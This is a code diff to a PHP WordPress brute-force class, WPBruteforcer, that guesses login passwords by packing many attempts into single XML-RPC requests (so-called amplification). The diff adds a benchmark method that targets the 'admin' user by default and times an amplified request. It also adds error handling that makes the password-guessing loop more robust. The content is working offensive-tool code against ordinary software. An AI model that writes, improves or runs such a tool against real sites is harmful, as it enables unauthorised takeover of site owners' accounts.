@@ -3,6 +3,7 @@
 namespace Arall\WPBruteforcer;
 
 use \Curl\Curl;
+use DateTime;
 
 /**
  * WordPress Bruteforcer class.
@@ -184,6 +185,29 @@ class WPBruteforcer
         return $users;
     }
 
+    public function benchmark($tries)
+    {
+        $this->reset();
+
+        if (!$this->username) {
+            $this->setUsername('admin');
+        }
+
+        for ($x = 1; $x <= $tries; $x++) {
+            $this->addPassword($x);
+        }
+
+        $payload = $this->buildPayload();
+
+        $time = new DateTime('now');
+
+        $response = $this->xmlrpcRequest($payload);
+
+        $elapsed = $time->diff(new DateTime('now'))->format('%s');
+
+        return $response ? $elapsed : false;
+    }
+
     /**
      * Bruteforce a user using XMLRPC amplification.
      * Needs a preloaded URL, username and wordlist.
@@ -226,6 +250,8 @@ class WPBruteforcer
      *
      * @param string $password Password
      *
+     * @throws \Exception
+     *
      * @return string|bool Found password or false
      */
     private function loadWord($password)
@@ -237,6 +263,10 @@ class WPBruteforcer
         if ($this->current_line >= $this->tries) {
             $payload = $this->buildPayload();
             $response = $this->xmlrpcRequest($payload);
+
+            if (!$response) {
+                throw new \Exception('Server error', 1);
+            }
 
             if ($password = $this->checkResponse($response)) {
                 return $password;
@@ -379,11 +409,7 @@ class WPBruteforcer
      */
     private function xmlrpcRequest($data)
     {
-        if ($response = $this->request($this->xmlrpc_uri, $data)) {
-            return $response;
-        }
-
-        return false;
+        return $this->request($this->xmlrpc_uri, $data);
     }
 
     /**
@@ -408,7 +434,7 @@ class WPBruteforcer
             $curl->post($url, $post_data);
         }
 
-        if (!$curl->error) {
+        if (!$curl->error && !strstr((string) $curl->response->asXML(), 'parse error. not well formed')) {
             return $curl->response;
         }
 
